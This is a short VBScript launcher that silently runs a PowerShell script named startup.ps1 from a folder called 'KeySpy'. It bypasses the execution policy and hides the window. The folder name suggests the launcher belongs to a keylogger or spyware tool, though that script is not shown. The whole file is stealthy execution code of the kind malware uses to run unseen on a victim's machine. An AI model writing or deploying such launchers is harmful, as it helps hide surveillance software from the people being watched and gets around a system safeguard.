Set objShell = CreateObject("WScript.Shell")

' Run the PowerShell script silently
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\Users\samra\Desktop\KeySpy\startup.ps1""", 0, True
